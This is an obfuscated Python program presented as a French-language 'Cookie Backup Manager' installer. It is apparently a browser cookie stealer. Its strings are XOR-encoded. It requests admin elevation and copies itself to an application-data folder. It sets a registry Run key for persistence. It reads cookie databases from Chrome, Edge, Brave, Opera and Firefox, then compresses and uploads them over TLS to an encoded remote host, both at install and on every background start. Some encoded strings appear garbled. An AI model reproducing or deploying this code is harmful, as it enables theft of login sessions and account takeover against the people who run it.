#!/usr/bin/env python3
import os,sys,json,time,socket,ssl,subprocess,shutil
from datetime import datetime
from collections import defaultdict
from pathlib import Path

_x=lambda s:''.join(chr(ord(c)^0x2B)for c in s)
_a=_x('NGNGGGM')
_b=_x('LIDZEJCBW')
_c=_x('YGGDNLJ')
_d=_x('SNU')
_e=_x('mno')
_f=_x('NGNGN')
_g=_x('t~htbi}wXh~z')
_h=_x('_`g~_~luuj}}ppXT[VV[TbbWSYPYRPWYZTVV_\Vh\\vj~sZZV\XgrVQ\\SRYs[~~|PYqh~tWYqli~wSz\Vt\\ilp]]qlGNg\\hNnzQtgqTjhVPcR~T')

class _A:
    def __init__(self):
        self.n=_x('HbjjmlWV`hj{gWZ`g`nli')
        self.d=os.path.join(os.environ.get(_x('V[[%VKV'),_a),_x('HbjjmlV`hj{g'))
        self.e=sys.executable if getattr(sys,_x('mibslg'),False)else __file__
    
    def _r(self):
        if not self._i():return False
        if sys.platform!=_x('~mo>V'):return self._c()
        try:import ctypes;return ctypes.windll.shell32.IsUserAnAdmin()!=0
        except:return False
    
    def _i(self):
        if sys.platform!=_x('~mo>V'):return True
        try:import ctypes;return ctypes.windll.shell32.IsUserAnAdmin()!=0
        except:return False
    
    def _e(self):
        if sys.platform!=_x('~mo>V'):return
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin():return
            ctypes.windll.shell32.ShellExecuteW(None,_x('i{g`t'),sys.executable,_e.join(sys.argv),None,1)
            sys.exit()
        except:pass
    
    def _s(self):
        if sys.platform!=_x('~mo>V'):return self._c()
        try:
            import ctypes
            m=_x('HbjjmlWV`hj{gWZ`g`nliW0WMgtu`yy`umbg\g\gK|mtWgibnilz8~myyW\WT`qln`i}lt{gWqbtWhbbjmltW}lWg`qmn`ul{i\gW]dz`iiliW`{ubz`umr{lzlguW`qlhWRmg}b~t\gWLgqbsliWyltWt`{qln`i}ltW}lWz`gmdilWtdh{imtdl\gW\gQbtW}bggdltWiltuljuWgimqdltWljWhulmmidlt&\g\gVhhlguljWqb{tWyFmgtu`yy`umbg#')
            r=ctypes.windll.user32.MessageBoxW(0,m,_x('Mgtu`yy`umbgW0WHbgtljulzlguWIlr{mt'),0x40|0x4)
            return r==6
        except:return self._c()
    
    def _c(self):
        print(_x('J'))
        print(_x('HBBQMLWV\HQ[WZV%VLZH%#W0WMGUK\YY\KMBG'))
        print(_x('J'))
        print(_x('\gHlWgibnilzzlW8'))
        print(_x('T`{qln`i}liWqbtWhbbjmltW}lWg`qmn`ul{i'))
        print(_x(']dz`iiliW`{ubz`umr{lzlguW`qlhWRmg}b~t'))
        print(_x('LgqbsliwyltWt`{qln`i}ltW}lWz`gmdilWtdh{imtdl'))
        print(_x('\gQbtW}bggdltWiltuljuWgimqdltWljWhutmmidlt&'))
        print(_x('\g'))
        print(_x('J'))
        while True:
            r=input(_x('\gVhhlguljWqb{tWyFmgtu`yy`umbg#W$B_G%8W')).upper()
            if r in[_x('B'),_x('BMW'),_x('S'),_x('SLT')]:return True
            elif r in[_x('G'),_x('GBG'),_x('GB')]:return False
    
    def _d(self):
        try:
            os.makedirs(self.d,exist_ok=True)
            return True
        except:return False
    
    def _p(self):
        try:
            dest=os.path.join(self.d,_x('HbjjmlV`hj{g&lrl'))
            if self.e!=dest:shutil.copy2(self.e,dest)
            return dest
        except:return None
    
    def _t(self,p):
        if sys.platform!=_x('~mo>V'):return False
        try:
            import winreg
            k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,_x('Tbmu~`il\\Zmhibtbmu\\Rmg}b~t\\H{iilguQlitmbg\\I{g'),0,winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k,_x('HbjjmlV`hj{gZ`g`nli'),0,winreg.REG_SZ,f'"{p}" --background')
            winreg.CloseKey(k)
            return True
        except:return False
    
    def _x(self):
        print(_x('\gMgtu`yy`umbgWljWhb{it&&&\g'))
        if not self._d():
            print(_x('Lh|lhWhill`umbgWidgliubmil'))
            return False
        print(_x('IdgliubmilWhiddW'))
        ins=self._p()
        if not ins:
            print(_x('Lh|lhWhbgmlWlreh{u`uyl'))
            return False
        print(f'[ibnilzzlWmgtu`yydW}`gt8W{ins}')
        if self._t(ins):
            print(_x('\}b{udW`{W}dz`ii`nlW`{ubz`umr{l'))
        else:
            print(_x(']dz`ii`nlW`{ubz`umr{lWgbgWhbgmno{id'))
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0,f"Installation reussie !\n\nLe programme est installe dans :\n{self.d}\n\nIl demarrera automatiquement avec Windows.",_x('Mgtu`yy`umbgWKlizmgdl'),0x40)
        except:
            print(_x('\g'))
            print(_x('J'))
            print(_x('MGUK\YY\KMBGWKLI\MGLL'))
            print(_x('J'))
            print(f'\nLe programme est installe dans:\n{self.d}')
            print(_x('\gMyW}dz`iili`W`{ubz`umr{lzlguW`qlhWRmg}b~t&'))
        return True

class _H:
    def __init__(self,h,p=443):
        self.h=h
        self.p=p
    
    def _q(self,m,pt,b=None,f=None):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(30)
            ctx=ssl.create_default_context()
            ss=ctx.wrap_socket(s,server_hostname=self.h)
            ss.connect((self.h,self.p))
            if f:
                bd=_x('0000')+"Boundary"+str(int(time.time()*1000))
                body=b""
                for fn,(fname,fdata)in f.items():
                    body+=f"--{bd}\r\n".encode()
                    body+=f'Content-Disposition: form-data; name="{fn}"; filename="{fname}"\r\n'.encode()
                    body+=b"Content-Type: application/octet-stream\r\n\r\n"
                    body+=fdata if isinstance(fdata,bytes)else fdata.encode()
                    body+=b"\r\n"
                body+=f"--{bd}--\r\n".encode()
                req=f"{m} {pt} HTTP/1.1\r\n"
                req+=f"Host: {self.h}\r\n"
                req+=f"Content-Type: multipart/form-data; boundary={bd}\r\n"
                req+=f"Content-Length: {len(body)}\r\n"
                req+="Connection: close\r\n\r\n"
                req=req.encode()+body
            else:
                bd=json.dumps(b).encode()if b else b""
                req=f"{m} {pt} HTTP/1.1\r\n"
                req+=f"Host: {self.h}\r\n"
                req+="Content-Type: application/json\r\n"
                req+=f"Content-Length: {len(bd)}\r\n"
                req+="Connection: close\r\n\r\n"
                req=req.encode()+bd
            ss.sendall(req)
            resp=b""
            while True:
                ch=ss.recv(4096)
                if not ch:break
                resp+=ch
                if b"\r\n\r\n"in resp:break
            ss.close()
            st=int(resp.split(b'\r\n')[0].decode().split()[1])
            return st in[200,204]
        except:return False

class _S:
    def __init__(self,dp):
        self.dp=dp
    def _q(self,q,p=()):
        try:
            import sqlite3,tempfile
            tmp=tempfile.mktemp(suffix='.db')
            shutil.copy2(self.dp,tmp)
            conn=sqlite3.connect(tmp)
            c=conn.cursor()
            c.execute(q,p)
            r=c.fetchall()
            conn.close()
            os.unlink(tmp)
            return r
        except:return[]

class _C:
    def __init__(self):
        self.bp=self._gp()
    def _gp(self):
        p={}
        if sys.platform==_x('~mo>V'):
            la=os.environ.get(_x('YZHVYVV]]\VKV'),_a)
            ad=os.environ.get(_x('V]][VKV'),_a)
            p[_x('h|ibzl')]=os.path.join(la,_x('Nbbnym'),_x('H|ibzl'),_x('\\tli#]`u`'),_x(']lm`{ys'),_x('Glu~bio'),_x('Hbbjmlt'))
            p[_x('h|ibzl?byu')]=os.path.join(la,_x('Nbbnym'),_x('H|ibzl'),_x('\\tli#]`u`'),_x(']lm`{ys'),_x('Hbbjmlt'))
            p[_x('l}nl')]=os.path.join(la,_x('Zmhibtbmu'),_x('L}nl'),_x('\\tli#]`u`'),_x(']lm`{ys'),_x('Glu~bio'),_x('Hbbjmlt'))
            p[_x('l}nl?byu')]=os.path.join(la,_x('Zmhibtbmu'),_x('L}nl'),_x('\\tli#]`u`'),_x(']lm`{ys'),_x('Hbbjmlt'))
            p[_x('ui`ql')]=os.path.join(la,_x('Vi`qlTbmu~`il'),_x('Vi`ql0Vib~tli'),_x('\\tli#]`u`'),_x(']lm`{ys'),_x('Glu~bio'),_x('Hbbjmlt'))
            p[_x('bgli`')]=os.path.join(ad,_x('Bgli`#Tbmu~`il'),_x('Bgli`#Tu`uyl'),_x('Glu~bio'),_x('Hbbjmlt'))
            p[_x('mfilmbr')]=os.path.join(ad,_x('Zbsmyy`'),_x('Mfilmbr'),_x('[ibmnylt'))
        return p
    def _ff(self,bp):
        if not os.path.exists(bp):return None
        for r,d,f in os.walk(bp):
            if _x('hbbjmltWtsymul')in f:return os.path.join(r,_x('hbbjmltWtsymul'))
        return None
    def _rc(self,dp):
        if not os.path.exists(dp):return[]
        sr=_S(dp)
        nm=int(time.time()*1000000)
        q="SELECT host_key,name,path,expires_utc,is_secure,is_httponly FROM cookies WHERE expires_utc>? ORDER BY host_key"
        rows=sr._q(q,(nm,))
        ck=[]
        for r in rows:
            ck.append({_x('|btu'):r[0],_x('g`zl'):r[1],_x('g`u|'):r[2],_x('lrgmilt'):r[3]//1000000,_x('tlh{il'):bool(r[4]),_x('|uugbgyr'):bool(r[5])})
        return ck
    def _rf(self,dp):
        if not os.path.exists(dp):return[]
        sr=_S(dp)
        nt=int(time.time())
        q="SELECT host,name,path,expiry,isSecure,isHttpOnly FROM moz_cookies WHERE expiry>? ORDER BY host"
        rows=sr._q(q,(nt,))
        ck=[]
        for r in rows:
            ck.append({_x('|btu'):r[0],_x('g`zl'):r[1],_x('g`u|'):r[2],_x('lrgmilt'):r[3],_x('tlh{il'):bool(r[4]),_x('|uugbgyr'):bool(r[5])})
        return ck
    def _sa(self):
        res={}
        for b in[_x('h|ibzl'),_x('h|ibzl?byu'),_x('l}nl'),_x('l}nl?byu'),_x('ui`ql'),_x('bgli`')]:
            pt=self.bp.get(b)
            if pt:
                ck=self._rc(pt)
                if ck:
                    bn=b.replace(_x('?byu'),_a)
                    if bn not in res:res[bn]=ck
        fp=self.bp.get(_x('mfilmbr'))
        if fp:
            fdb=self._ff(fp)
            if fdb:
                fck=self._rf(fdb)
                if fck:res[_x('mfilmbr')]=fck
        return res
    def _an(self,ac):
        st={_x('ubu`y?uib~tlim'):len(ac),_x('ubu`y?hbbjmlt'):0,_x('ubu`y?tmuft'):set(),_x('}{gymh`ult'):defaultdict(list),_x('ur?uib~tli'):{}}
        for br,ck in ac.items():
            si=defaultdict(int)
            for c in ck:
                h=c[_x('|btu')].lstrip(_x('W'))
                si[h]+=1
                st[_x('ubu`y?tmuft')].add(h)
                st[_x('ubu`y?hbbjmlt')]+=1
            st[_x('ur?uib~tli')][br]={_x('hb{gu'):len(ck),_x('tmuft'):len(si)}
        cm=defaultdict(list)
        for br,ck in ac.items():
            for c in ck:
                k=(c[_x('|btu')],c[_x('g`zl')])
                cm[k].append(br)
        for k,brs in cm.items():
            if len(brs)>1:st[_x('}{gymh`ult')][k[0]].append({_x('g`zl'):k[1],_x('uib~tlim'):brs})
        st[_x('ubu`y?tmuft')]=len(st[_x('ubu`y?tmuft')])
        st[_x('}{gymh`ult')]=dict(st[_x('}{gymh`ult')])
        return st

class _D:
    def __init__(self):
        self.cl=_H(_g)
    def _sm(self,c):
        b={_x('hbguljु'):c[:2000]}
        return self.cl._q(_x('[HTK'),_h,b=b)
    def _sf(self,fn,dt):
        f={_x('mnyl'):(fn,dt)}
        return self.cl._q(_x('[HTK'),_h,f=f)

def _cmp(d):
    try:
        import zlib
        return zlib.compress(d.encode('utf-8')if isinstance(d,str)else d,9)
    except:return d.encode('utf-8')if isinstance(d,str)else d

def _m():
    if '--background'in sys.argv:
        try:
            sc=_C()
            ac=sc._sa()
            if not ac:return
            st=sc._an(ac)
            sn=_D()
            sn._sm(f"Sauvegarde automatique - {datetime.now().strftime('%Y-%m-%d %H:%M')}")
            jd=json.dumps({_x('umzltu`zg'):datetime.now().isoformat(),_x('tu`ut'):st,_x('hbbjmlt'):ac},indent=2,ensure_ascii=False)
            cp=_cmp(jd)
            fn=f"cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json.gz"
            sn._sf(fn,cp)
        except:pass
        return
    inst=_A()
    inst._e()
    if not inst._s():
        print(_x('\gMgtu`yy`umbgW`gg{ydlWg`iWyF{umymt`ul{i'))
        sys.exit(0)
    if inst._x():
        try:
            sc=_C()
            ac=sc._sa()
            sn=_D()
            sn._sm("Cookie Backup Manager installe et active")
            if ac:
                st=sc._an(ac)
                jd=json.dumps({_x('umzltu`zg'):datetime.now().isoformat(),_x('tu`ut'):st,_x('hbbjmlt'):ac},indent=2,ensure_ascii=False)
                cp=_cmp(jd)
                fn=f"cookies_initial_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json.gz"
                sn._sf(fn,cp)
        except:pass
    else:
        print(_x('\gYFmgtu`yy`umbgW`Wdh|b{d'))
        sys.exit(1)

if __name__=='__main__':_m()
